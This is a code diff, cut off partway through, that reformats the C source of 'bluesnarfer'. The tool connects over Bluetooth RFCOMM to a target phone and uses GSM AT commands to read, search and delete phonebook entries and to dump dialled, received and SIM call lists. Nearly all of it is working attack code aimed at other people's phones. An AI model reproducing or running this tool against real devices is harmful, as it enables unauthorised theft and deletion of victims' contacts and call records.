@@ -1,30 +1,32 @@
 /*
- 	bluesnarfer .. 
- 	bluetooth snarfing tool , there is also one mutch better than that, minicom :P
+        bluesnarfer ..
+        bluetooth snarfing tool , there is also one mutch better than that,
+   minicom :P
 
-	Authors: Roberto Martelloni "boos", Davide Del Vecchio "Dante Alighieri"..
-	Email : r.martelloni2003@libero.it, dante@alighieri.org ..
+        Authors: Roberto Martelloni "boos", Davide Del Vecchio "Dante
+   Alighieri".. Email : r.martelloni2003@libero.it, dante@alighieri.org ..
 
-	
-	TODO: 
-	- REWRITE ALL the code in a better way .. 
-	- add sms (mms?)
-	- add call to number
-	- add inquiry procedure
-	- create a ncurses interface ?
-	- create db of vulnerable device 
-	- sdp port scan 
+        
+        TODO:
+        - REWRITE ALL the code in a better way ..
+        - add sms (mms?)
+        - add call to number
+        - add inquiry procedure
+        - create a ncurses interface ?
+        - create db of vulnerable device
+        - sdp port scan
 
 */
 
-#include <stdio.h>
-#include <stdlib.h>
 #include <errno.h>
 #include <getopt.h>
-#include <termios.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
-#include <signal.h>
+#include <termios.h>
+#include <unistd.h>
 
 #include <bluetooth/bluetooth.h>
 #include <bluetooth/hci.h>
@@ -33,641 +35,681 @@
 
 #include "bluesnarfer.h"
 
-void parse_rw(struct opt *options, char *toparse) { 
+void parse_rw(struct opt *options, char *toparse) {
 
-	char *ptr;
-	if ( ptr = strchr(toparse, '-') ) {
+        char *ptr;
+        if (ptr = strchr(toparse, '-')) {
 
-		*ptr = 0 ; 
+                *ptr = 0;
 
-		options->N_MIN = atoi(optarg);
-		options->N_MAX = atoi(ptr+1);
-	}
-	else
-		options->N_MIN = options->N_MAX = atoi(optarg);
+                options->N_MIN = atoi(optarg);
+                options->N_MAX = atoi(ptr + 1);
+        } else
+                options->N_MIN = options->N_MAX = atoi(optarg);
 }
+int info_cmd(FILE *fd);
 
 int main(int ac, char **av) {
 
-	struct opt options;
-	int opt, dd;
+        struct opt options;
+        int opt, dd;
 
-	options.phonebook= options.bd_addr = 0x00; 
-	options.act = 0;
-	options.channel = 17; 
+        options.phonebook = options.bd_addr = 0x00;
+        options.act = 0;
+        options.channel = 17;
 
-	if ( getuid() ) { 
-		
-		fprintf(stderr, "bluesnarfer: you must be root\n");
-		usage(*av);
-	}
+        if (getuid()) {
 
-	while ((opt = getopt(ac, av, "C:b:c:r:w:f:s:ldih")) != EOF) { 
+                fprintf(stderr, "bluesnarfer: you must be root\n");
+                usage(*av);
+        }
 
-		switch(opt) {
+        while ((opt = getopt(ac, av, "C:b:c:r:w:f:s:ldih")) != EOF) {
 
-			case 'b':
-				options.bd_addr = optarg;
-				break;
+                switch (opt) {
 
-			case 'c':
-				options.act = CUSTOM;
-				options.custom_cmd = optarg;
-				break;
+                case 'b':
+                        options.bd_addr = optarg;
+                        break;
 
-			case 'C':
-				options.channel = atoi(optarg);
-				break;
+                case 'c':
+                        options.act = CUSTOM;
+                        options.custom_cmd = optarg;
+                        break;
 
-			case 'r':
-				options.act = READ;
-				parse_rw(&options, optarg);
-				break;
+                case 'C':
+                        options.channel = atoi(optarg);
+                        break;
 
-			case 'w':
-				options.act = WRITE;
-				parse_rw(&options, optarg);
-				break;
+                case 'r':
+                        options.act = READ;
+                        parse_rw(&options, optarg);
+                        break;
 
-			case 'f':
-				options.act = SEARCH;
-				options.name = optarg;
-				break;
+                case 'w':
+                        options.act = WRITE;
+                        parse_rw(&options, optarg);
+                        break;
 
-			case 's':
-				options.phonebook = optarg;
-				break;
+                case 'f':
+                        options.act = SEARCH;
+                        options.name = optarg;
+                        break;
 
-			case 'l':
-				options.act = LIST;
-				break;
+                case 's':
+                        options.phonebook = optarg;
+                        break;
 
-			case 'i':
-				options.act = INFO;
-				break;
+                case 'l':
+                        options.act = LIST;
+                        break;
 
-			default:
-				usage(*av);
-				break;
-		}
-	}
+                case 'i':
+                        options.act = INFO;
+                        break;
 
-	if ( optind > 5 && !(options.phonebook || options.channel)) {
+                default:
+                        usage(*av);
+                        break;
+                }
+        }
 
-		fprintf(stderr,"bluesnarfer: use only one action\n");
-		exit(0);
-	}
+        if (optind > 5 && !(options.phonebook || options.channel)) {
 
-	if ( !options.bd_addr ) { 
+                fprintf(stderr, "bluesnarfer: use only one action\n");
+                exit(0);
+        }
 
-		fprintf(stderr, "bluesnarfer: you must set bd_addr\n");
-		usage(*av);
-	}
-	
-	if (!options.act) {
+        if (!options.bd_addr) {
 
-		fprintf(stderr, "bluesnarfer: select an action\n");
-		usage(*av);
-	} 
+                fprintf(stderr, "bluesnarfer: you must set bd_addr\n");
+                usage(*av);
+        }
 
+        if (!options.act) {
 
-	bluesnarfer(options); 
+                fprintf(stderr, "bluesnarfer: select an action\n");
+                usage(*av);
+        }
 
-	exit(0);
+        bluesnarfer(options);
+
+        exit(0);
 }
 
-int bluesnarfer(struct opt options) { 
+int bluesnarfer(struct opt options) {
 
-	FILE *fd;
+        FILE *fd;
 
-	signal(SIGINT,  (void *)bt_rfcomm_rel);
-	signal(SIGSEGV,  (void *)bt_rfcomm_rel);
+        signal(SIGINT, (void *)bt_rfcomm_rel);
+        signal(SIGSEGV, (void *)bt_rfcomm_rel);
 
-	if ((device = hci_for_each_dev(HCI_UP, 0x00, 0)) < 0 ) 
-		fprintf(stderr, "bluesnarfer: hci_for_each_dev , %s\n", strerror(errno));
+        if ((device = hci_for_each_dev(HCI_UP, 0x00, 0)) < 0)
+                fprintf(stderr, "bluesnarfer: hci_for_each_dev , %s\n",
+                        strerror(errno));
 
-    if ( bt_get_remote_name(options.bd_addr) < 0 ) 
-        fprintf(stderr, "bluesnarfer: unable to get device name\n");
+        //fprintf(stderr, "bluesnarfer: bt_get_remote_name(options.bd_addr)\n");
+        if (bt_get_remote_name(options.bd_addr) < 0)
+                fprintf(stderr, "bluesnarfer: unable to get device name\n");
 
-    if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_RFCOMM)) < 0 ) 
-        fprintf(stderr, "bluesnarfer: Can't open RFCOMM control socket");
+        //fprintf(stderr, "bluesnarfer: creating RFCOMM control socket\n");
+        if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_RFCOMM)) < 0)
+                fprintf(stderr,
+                        "bluesnarfer: Can't open RFCOMM control socket");
 
-    if (!(fd = bt_rfcomm(ctl, options.bd_addr, options.channel))) 
-        fprintf(stderr,"bluesnarfer: unable to create rfcomm connection\n");
+        //fprintf(stderr, "bluesnarfer: calling bt_rfcomm(ctl, options.bd_addr, "
+        //                "options.channel)\n");
+        if (!(fd = bt_rfcomm(ctl, options.bd_addr, options.channel)))
+                fprintf(stderr,
+                        "bluesnarfer: unable to create rfcomm connection\n");
 
-    if ( switch_cmd(fd, options) < 0 ) 
-        fprintf(stderr, "bluesnarfer: send_cmd failed\n");
+        //fprintf(stderr, "bluesnarfer: calling switch_cmd(fd, options)\n");
+        if (switch_cmd(fd, options) < 0)
+                fprintf(stderr, "bluesnarfer: send_cmd failed\n");
 
-    bt_rfcomm_rel();
+        bt_rfcomm_rel();
 
-	return 0; 
+        return 0;
 }
 
 void usage(char *bin) {
 
-	fprintf(stderr, "bluesnarfer, version %s -\n"
-					"usage: %s [options] [ATCMD] -b bt_addr\n\n"
-					"ATCMD     : valid AT+CMD (GSM EXTENSION)\n\n"
-					"TYPE      : valid phonebook type ..\n"
-					"example   : \"DC\" (dialed call list)\n" 
-					"            \"SM\" (SIM phonebook)\n"
-					"            \"RC\" (recevied call list)\n"
-					"            \"XX\" much more\n\n"
-					"-b bdaddr : bluetooth device address\n"
-					"-C chan   : bluetooth rfcomm channel\n\n"
-					"-c ATCMD  : custom action\n"
-					"-r N-M    : read phonebook entry N to M \n"
-					"-w N-M    : delete phonebook entry N to M\n"
-					"-f name   : search \"name\" in phonebook address\n"
-					"-s TYPE   : select phonebook memory storage\n"
-					"-l        : list aviable phonebook memory storage\n"
-					"-i        : device info\n", VERSION, bin);
-	exit(0);
+        fprintf(stderr,
+                "bluesnarfer, version %s -\n"
+                "usage: %s [options] [ATCMD] -b bt_addr\n\n"
+                "ATCMD     : valid AT+CMD (GSM EXTENSION)\n\n"
+                "TYPE      : valid phonebook type ..\n"
+                "example   : \"DC\" (dialed call list)\n"
+                "            \"SM\" (SIM phonebook)\n"
+                "            \"RC\" (recevied call list)\n"
+                "            \"XX\" much more\n\n"
+                "-b bdaddr : bluetooth device address\n"
+                "-C chan   : bluetooth rfcomm channel\n\n"
+                "-c ATCMD  : custom action\n"
+                "-r N-M    : read phonebook entry N to M \n"
+                "-w N-M    : delete phonebook entry N to M\n"
+                "-f name   : search \"name\" in phonebook address\n"
+                "-s TYPE   : select phonebook memory storage\n"
+                "-l        : list aviable phonebook memory storage\n"
+                "-i        : device info\n",
+                VERSION, bin);
+        exit(0);
 }
 
 int bt_get_remote_name(char *str_bdaddr) {
 
-	struct hci_conn_info_req cr;
-	int dd, cc, handler;
-	char name[248];
-	bdaddr_t bdaddr;
+        struct hci_conn_info_req cr;
+        int dd, cc, handler;
+        char name[248];
+        bdaddr_t bdaddr;
 
-	if ((dd = hci_open_dev(device)) < 0) {
+        if ((dd = hci_open_dev(device)) < 0) {
 
-		fprintf(stderr, "bluesnarfer: hci_open_dev : %s\n", strerror(errno));
-		return -1;
-	}
+                fprintf(stderr, "bluesnarfer: hci_open_dev : %s\n",
+                        strerror(errno));
+                return -1;
+        }
 
-	str2ba(str_bdaddr, &bdaddr);
+        str2ba(str_bdaddr, &bdaddr);
 
-	memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
-	cr.type = ACL_LINK;
+        memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
+        cr.type = ACL_LINK;
 
-	if (ioctl(dd, HCIGETCONNINFO, (unsigned long) &cr) < 0) {
+        if (ioctl(dd, HCIGETCONNINFO, (unsigned long)&cr) < 0) {
 
-		if ((cc = hci_create_connection(dd, &bdaddr, htobs(HCI_DM1 | HCI_DH1), 0, 0, (void *)&handler, 25000)) < 0) {
+                if ((cc = hci_create_connection(dd, &bdaddr,
+                                                htobs(HCI_DM1 | HCI_DH1), 0, 0,
+                                                (void *)&handler, 25000)) < 0) {
 
-			fprintf(stderr, "bluesnarfer: hci_create_connection failed\n");
-			hci_close_dev(dd);
+                        fprintf(stderr,
+                                "bluesnarfer: hci_create_connection failed\n");
+                        hci_close_dev(dd);
 
-			return -1;
-		}
-	}
+                        return -1;
+                }
+        }
 
+        if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {
 
-	if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {
-		
-		fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");
+                fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");
 
-		hci_close_dev(dd);
-		hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION, 10000);
+                hci_close_dev(dd);
+                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
+                               10000);
 
-		return -1;
-	}
+                return -1;
+        }
 
-	printf("device name: %s\n", name);
+        printf("device name: %s\n", name);
 
-	if (cc) hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION, 10000);
+        if (cc)
+                hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
+                               10000);
 
-	hci_close_dev(dd);
-	return 0;
+        hci_close_dev(dd);
+        return 0;
 }
-
 
 char *rfcomm_read(FILE *fp, char *send) {
 
-	int r, line_size, ret; 
-	char *line; 
+        int r, ret;
+        char *line;
 
-	line = 0x00; 
-	ret = line_size = 0;
+        long unsigned int line_size;
 
-	while ( 1 ) { 
+        line = 0x00;
+        ret = line_size = 0;
 
-		r = getline(&line, &line_size, fp);
+        while (1) {
 
-		line[ r - 1 ] = 0;
+                r = getline(&line, &line_size, fp);
 
-		if ( !strncmp(line, send, strlen(line)) && !ret ) { 
+                line[r - 1] = 0;
 
-			ret = 1; 
-			continue; 
-		}
+                if (!strncmp(line, send, strlen(line)) && !ret) {
 
-		if ( strncmp(line, send, strlen(line)) && ret ) return line; 
-	}
+                        ret = 1;
+                        continue;
+                }
 
-    return 0x00;
-}
-	
-FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) { 
+                if (strncmp(line, send, strlen(line)) && ret)
+                        return line;
+        }
 
-	struct rfcomm_dev_req req;
-	int device, ctl;
-	bdaddr_t bdaddr;
-	FILE *fd;
-
-	if ((device = hci_get_route(0x00)) < 0) {
-		
-		fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
-		return 0x00;
-	}
-
-	str2ba(str_bdaddr, &bdaddr);
-
-	memset(&req, 0x00, sizeof(req));
-
-
-	req.dev_id = device; 
-	req.channel = channel; 
-
-	memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY));
-	memcpy(&req.dst, &bdaddr, sizeof(bdaddr));	
-
-	if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0 ) {
-		
-		fprintf(stderr, "bluesnarfer: ioctl RFCOMMCREATEDEV failed, %s\n", strerror(errno));
-		return 0x00;
-	}
-
-	if (!(fd = bt_rfcomm_config())) { 
-
-		fprintf(stderr, "bluesnarfer: bt_rfcomm_config failed\n");
-		return 0x00;
-	}
-
-	return fd;
+        return 0x00;
 }
 
-FILE *bt_rfcomm_config() { 
+FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {
 
-	char dev_device[1024];
-	struct termios term;
-	FILE *fd;
-	int fdc;
+        struct rfcomm_dev_req req;
+        int device, ctl;
+        bdaddr_t bdaddr;
+        FILE *fd;
 
-	snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);
+        //fprintf(stderr, "calling hci_get_route(0x00)\n");
+        if ((device = hci_get_route(0x00)) < 0) {
 
-	if (!(fd = fopen(dev_device, "r+"))) { 
-		
-		fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device, strerror(errno));
-		return 0x00;
-	}
+                fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
+                return 0x00;
+        }
 
-	fdc = fileno(fd);
+        str2ba(str_bdaddr, &bdaddr);
 
-	if ( tcgetattr(fdc, &term) < 0 ) {
-		
-		fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n", strerror(errno));
-		return 0x00;
-	}
+        memset(&req, 0x00, sizeof(req));
 
-	term.c_cflag = CS8 | CLOCAL | CREAD;
-	term.c_iflag = ICRNL;
-	term.c_oflag = 0;
-	term.c_lflag = ICANON;
+        req.dev_id = device;
+        req.channel = channel;
 
-	tcsetattr(fdc,TCSANOW,&term);
+        memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY));
+        memcpy(&req.dst, &bdaddr, sizeof(bdaddr));
 
-	if ( (cfsetispeed(&term, B230400) < 0) || (cfsetospeed(&term, B230400) < 0)) { 
-		
-		fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n", strerror(errno));
-		return 0x00;
-	}
+        //fprintf(stderr, "calling ioctl(sock, RFCOMMCREATEDEV, &req)\n");
+        if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0) {
 
-	return fd;
+                fprintf(stderr,
+                        "bluesnarfer: ioctl RFCOMMCREATEDEV failed, %s\n",
+                        strerror(errno));
+                return 0x00;
+        }
+
+        //fprintf(stderr, "calling bt_rfcomm_config()\n");
+        if (!(fd = bt_rfcomm_config())) {
+
+                fprintf(stderr, "bluesnarfer: bt_rfcomm_config failed\n");
+                return 0x00;
+        }
+
+        return fd;
 }
 
-// i can do it better .. 
+FILE *bt_rfcomm_config() {
+
+        char dev_device[1024];
+        struct termios term;
+        FILE *fd;
+        int fdc;
+
+        snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);
+
+        //fprintf(stderr, "opening %s\n", dev_device);
+        if (!(fd = fopen(dev_device, "r+"))) {
+                fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device,
+                        strerror(errno));
+                return 0x00;
+        }
+
+        fdc = fileno(fd);
+
+        //fprintf(stderr, "calling tcgetattr(fdc, &term)\n");
+        if (tcgetattr(fdc, &term) < 0) {
+
+                fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n",
+                        strerror(errno));
+                return 0x00;
+        }
+
+        term.c_cflag = CS8 | CLOCAL | CREAD;
+        term.c_iflag = ICRNL;
+        term.c_oflag = 0;
+        term.c_lflag = ICANON;
+
+        tcsetattr(fdc, TCSANOW, &term);
+
+        if ((cfsetispeed(&term, B230400) < 0) ||
+            (cfsetospeed(&term, B230400) < 0)) {
+
+                fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n",
+                        strerror(errno));
+                return 0x00;
+        }
+
+        return fd;
+}
+
+// i can do it better ..
 int switch_cmd(FILE *fd, struct opt options) {
 
-	int ret; 
+        int ret;
 
-	switch(options.act) {
-		
-		case CUSTOM: 
-			ret = custom_cmd(fd, options.custom_cmd); 
-			break;
+        switch (options.act) {
 
-		case READ:
-			ret = rw_cmd(fd, options);
-			break;
+        case CUSTOM:
+                //fprintf(stderr, "ret = custom_cmd(fd, options.custom_cmd);\n");
+                ret = custom_cmd(fd, options.custom_cmd);
+                break;
 
-		case WRITE:
-			ret = rw_cmd(fd, options); 
-			break;
+        case READ:
+                //fprintf(stderr, "ret = rw_cmd(fd, options);\n");
+                ret = rw_cmd(fd, options);
+                break;
 
-		case SEARCH:
-			ret = search_cmd(fd, options); 
-			break;
+        case WRITE:
+                //fprintf(stderr, "ret = rw_cmd(fd, options);\n");
+                ret = rw_cmd(fd, options);
+                break;
 
-		case LIST:
-			ret = list_cmd(fd);
-			break;
+        case SEARCH:
+                //fprintf(stderr, "ret = search_cmd(fd, options);\n");
+                ret = search_cmd(fd, options);
+                break;
 
-		case INFO:
-			ret = info_cmd(fd);
-			break;
-	}
+        case LIST:
+                //fprintf(stderr, "ret = list_cmd(fd);\n");
+                ret = list_cmd(fd);
+                break;
 
-	return ret;
+        case INFO:
+                //fprintf(stderr, "ret = info_cmd(fd);\n");
+                ret = info_cmd(fd);
+                break;
+        }
+
+        return ret;
 }
 
-// raw output .. 
+// raw output ..
 int custom_cmd(FILE *fd, char *cmd) {
 
-	char buffer[128], *ptr;
-	int r, bsize; 
+        char buffer[128], *ptr;
+        int r, bsize;
 
-	if ( !strstr(cmd, "AT") ) { 
+        if (!strstr(cmd, "AT")) {
 
-		printf("bluesnarfer: invalid command inserted, you must insert AT.*\n");
-		return -1;
-	}
+                printf("bluesnarfer: invalid command inserted, you must insert "
+                       "AT.*\n");
+                return -1;
+        }
 
-	snprintf(buffer, 128, "%s\r\n", cmd);
+        snprintf(buffer, 128, "%s\r\n", cmd);
 
-	if (!fwrite(buffer, strlen(buffer), 1, fd)) { 
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-		fprintf(stderr, "bluesnarfer: fwrite, %s", strerror(errno));
-		return -1;
-	}
+                fprintf(stderr, "bluesnarfer: fwrite, %s", strerror(errno));
+                return -1;
+        }
 
-	printf("custum cmd selected, raw output\n");
+        printf("custum cmd selected, raw output\n");
 
-	if ( !(ptr = rfcomm_read(fd, buffer)) ) {
-		
-		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
-		return -1;
-	}
+        if (!(ptr = rfcomm_read(fd, buffer))) {
 
-	printf("%s\n", ptr);
+                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
+                return -1;
+        }
 
-	return 0;
+        printf("%s\n", ptr);
+
+        return 0;
 }
 
 void bt_rfcomm_rel() {
 
-	struct rfcomm_dev_req req;
+        struct rfcomm_dev_req req;
 
-	memset(&req, 0x00, sizeof(req));
-	req.dev_id = device;
+        memset(&req, 0x00, sizeof(req));
+        req.dev_id = device;
 
-	if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0 ) {
-		
-		fprintf(stderr, "bluesnarfer: unable to relase rfcomm\n");
-		exit(-1);
-	}
+        if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0) {
 
-	printf("bluesnarfer: release rfcomm ok\n");
+                fprintf(stderr, "bluesnarfer: unable to relase rfcomm\n");
+                exit(-1);
+        }
 
-	exit(0);
+        printf("bluesnarfer: release rfcomm ok\n");
+
+        exit(0);
 }
 
 int rw_cmd(FILE *fd, struct opt options) {
 
-	char buffer[32];
-	char *ptr, *tptr;
+        char buffer[32];
+        char *ptr, *tptr;
 
-	if ( !options.phonebook ) { 
+        if (!options.phonebook) {
 
-		fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);
+                fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);
 
-		rfcomm_read(fd, DEFAULTPB);
-	}
-	else {
+                rfcomm_read(fd, DEFAULTPB);
+        } else {
 
-		printf("custom phonebook selected\n");
-		snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
-		fwrite(buffer, strlen(buffer), 1, fd);
+                printf("custom phonebook selected\n");
+                snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
+                fwrite(buffer, strlen(buffer), 1, fd);
 
-		rfcomm_read(fd, buffer);
-	}
+                rfcomm_read(fd, buffer);
+        }
 
+        do {
 
-	do { 
+                if (options.act == READ)
+                        snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN);
 
-		if ( options.act == READ )
-			snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN);
+                else
+                        snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);
 
-		else snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);
+                if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-	    if (!fwrite(buffer, strlen(buffer), 1, fd)) {
+                        fprintf(stderr, "bluesnarfer: write, %s",
+                                strerror(errno));
+                        return -1;
+                }
 
-			fprintf(stderr, "bluesnarfer: write, %s", strerror(errno));
-		    return -1;
-		}
+                if (options.act == READ) {
 
+                        if (!(ptr = rfcomm_read(fd, buffer))) {
 
-		if ( options.act == READ ) { 
+                                fprintf(stderr,
+                                        "bluesnarfer: rfcomm_read failed\n");
+                                return -1;
+                        }
 
-			if ( !(ptr = rfcomm_read(fd, buffer)) ) { 
+                        if (tptr = parse(ptr)) {
 
-				fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
-				return -1;
-			}
+                                printf("%s\n", tptr);
+                                free(tptr);
+                        }
+                } else {
 
-			if (tptr = parse(ptr))  { 
-			
-				printf("%s\n", tptr); 
-				free(tptr); 
-			}
-		}
-		else {
+                        if (!rfcomm_read(fd, buffer)) {
 
-			if ( !rfcomm_read(fd, buffer) ) { 
+                                fprintf(stderr,
+                                        "bluesnarfer: rfcomm_read failed\n");
+                                return -1;
+                        }
 
-				fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
-				return -1;
-			}
+                        printf("delete of entry %d successfull\n",
+                               options.N_MIN);
+                }
 
-			printf("delete of entry %d successfull\n", options.N_MIN);
-		}
+                options.N_MIN++;
 
-		options.N_MIN++;
+        } while (options.N_MIN <= options.N_MAX);
 
-	} while ( options.N_MIN <= options.N_MAX ); 
-
-
-	return 0;
+        return 0;
 }
 
-char *parse(char *ptr) { 
+char *parse(char *ptr) {
 
-	char *pa, *tptr, *indx, *num, *name;
+        char *pa, *tptr, *indx, *num, *name;
 
-	pa = malloc(1024); 
-	memset(pa, 0x00, 1024); 
+        pa = malloc(1024);
+        memset(pa, 0x00, 1024);
 
-	// indx number .. 
-	if ( tptr = strchr(ptr, ':') ) { 
-	
-		indx = tptr + 1; 
-		if ( !strlen(indx) ) return 0x00;
+        // indx number ..
+        if (tptr = strchr(ptr, ':')) {
 
-		tptr = strchr(ptr, ',');
-		*tptr = 0;
-		ptr = tptr + 1; 
+                indx = tptr + 1;
+                if (!strlen(indx))
+                        return 0x00;
 
-		if ( !strlen(indx) ) return 0x00;
+                tptr = strchr(ptr, ',');
+                *tptr = 0;
+                ptr = tptr + 1;
 
-		tptr = strchr(ptr, '"');
-		num = tptr + 1;
+                if (!strlen(indx))
+                        return 0x00;
 
-		if ( !strlen(indx) ) return 0x00;
+                tptr = strchr(ptr, '"');
+                num = tptr + 1;
 
-		tptr = strchr(num, '"');
-		*tptr = 0; 
-	
-		ptr = tptr + 1; 
-		if ( !strlen(ptr) ) return 0x00;
-		tptr = strchr(ptr, '"');
+                if (!strlen(indx))
+                        return 0x00;
 
-		name = tptr + 1;
-		if ( !strlen(name) ) return 0x00;
-		tptr = strchr(name, '"');
-		*tptr = 0;
-		
-		snprintf(pa, 1024, "+ %s - %s : %s", indx, name, num);
+                tptr = strchr(num, '"');
+                *tptr = 0;
 
-		return pa;
-	}
+                ptr = tptr + 1;
+                if (!strlen(ptr))
+                        return 0x00;
+                tptr = strchr(ptr, '"');
 
-	return NULL;
+                name = tptr + 1;
+                if (!strlen(name))
+                        return 0x00;
+                tptr = strchr(name, '"');
+                *tptr = 0;
+
+                snprintf(pa, 1024, "+ %s - %s : %s", indx, name, num);
+
+                return pa;
+        }
+
+        return NULL;
 }
 
-int search_cmd(FILE *fd, struct opt options) { 
+int search_cmd(FILE *fd, struct opt options) {
 
-	char buffer[256], *ptr, *p;
+        char buffer[256], *ptr, *p;
 
-	printf("start to search name: %s\n", options.name); 
+        printf("start to search name: %s\n", options.name);
 
-	if ( options.phonebook ) 
-		snprintf(buffer, 256, "AT+CPBS=\"%s\"\r\n", options.phonebook);
-	else
-		snprintf(buffer, 256, "AT+CPBS=\"ME\"\r\n", options.phonebook);
+        if (options.phonebook)
+                snprintf(buffer, 256, "AT+CPBS=\"%s\"\r\n", options.phonebook);
+        else
+                snprintf(buffer, 256, "AT+CPBS=\"ME\"\r\n");
 
-	if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
-			
-		fprintf(stderr, "bluesnarfer: fwrite failed\n");
-		return -1;
-	} 
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-	rfcomm_read(fd, buffer);
-	
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
 
-	snprintf(buffer, 256, "AT+CPBF=\"%s\"\r\n", options.name);
-	if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
+        rfcomm_read(fd, buffer);
 
-		fprintf(stderr, "bluesnarfer: fwrite failed\n");
-		return -1;
-	}
+        snprintf(buffer, 256, "AT+CPBF=\"%s\"\r\n", options.name);
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-	if ( !(ptr = rfcomm_read(fd, buffer)) ) {
-		
-		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
-		return -1;
-	}
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
 
-	if ( !(p = parse(ptr)) ) 
-		printf("bluesnarfer: entry not found\n");
-	else 
-		printf("%s\n", p);
+        if (!(ptr = rfcomm_read(fd, buffer))) {
 
-	return 0;
+                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
+                return -1;
+        }
+
+        if (!(p = parse(ptr)))
+                printf("bluesnarfer: entry not found\n");
+        else
+                printf("%s\n", p);
+
+        return 0;
 }
 
-int list_cmd(FILE *fd) { 
+int list_cmd(FILE *fd) {
 
-	char buffer[] = "AT+CPBS=?\r\n";
-	char *c, *ptr;
-	char *phonebook[] = { "DC", "EN", "FD", "LD", "MC", "MT", "ON", "RC", "SM", "TA", NULL } ;
-	char *pbd[] = {
-					" DC  - Dialled call list\n", 
-					" EN  - Emergency number list\n", 
-					" FD  - SIM fix dialing list\n",
-					" LD  - SIM last dialing list\n", 
-					" MC  - ME missed call list\n", 
-					" MT  - ME + SIM conbined list\n",
-					" ON  - SIM o ME own number list\n",
-					" RC  - ME received calls list\n",
-					" SM  - SIM phonebook list\n",
-					" TA  - TA phonebook list\n", NULL };
-	int i;
+        char buffer[] = "AT+CPBS=?\r\n";
+        char *c, *ptr;
+        char *phonebook[] = {"DC", "EN", "FD", "LD", "MC", "MT",
+                             "ON", "RC", "SM", "TA", NULL};
+        char *pbd[] = {" DC  - Dialled call list\n",
+                       " EN  - Emergency number list\n",
+                       " FD  - SIM fix dialing list\n",
+                       " LD  - SIM last dialing list\n",
+                       " MC  - ME missed call list\n",
+                       " MT  - ME + SIM conbined list\n",
+                       " ON  - SIM o ME own number list\n",
+                       " RC  - ME received calls list\n",
+                       " SM  - SIM phonebook list\n",
+                       " TA  - TA phonebook list\n",
+                       NULL};
+        int i;
 
-	c = 0x00;
+        c = 0x00;
 
-    if ( !fwrite(buffer, strlen(buffer), 1, fd) ) {
+        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
 
-		fprintf(stderr, "bluesnarfer: fwrite failed\n");
-	    return -1;
-	}
+                fprintf(stderr, "bluesnarfer: fwrite failed\n");
+                return -1;
+        }
 
-    if ( !(ptr = rfcomm_read(fd, buffer)) ) {
-				
-		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
-		return -1;
-	}
+        if (!(ptr = rfcomm_read(fd, buffer))) {
 
-	printf("phobebook list: \n");
+                fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
+                return -1;
+        }
 
-	ptr = strchr(ptr, '(') + 1;
-	
-	while (c = strchr(ptr, ',')) { 
-	
-		*c = 0;
+        printf("phobebook list: \n");
 
-		for (i = 0;  phonebook[i] ; i++ ) { 
+        ptr = strchr(ptr, '(') + 1;
 
-			if ( strstr(ptr, phonebook[i]) ) { 
-				
-				printf("%s", pbd[i]); 
+        while (c = strchr(ptr, ',')) {
 
-				break;
-			}
-		}
+                *c = 0;
 
-		if ( !phonebook[i] ) 
-			printf("%s - Unknow phonebook list\n", ptr);
+                for (i = 0; phonebook[i]; i++) {
 
-		ptr = c + 1; 
+                        if (strstr(ptr, phonebook[i])) {
 
-	}
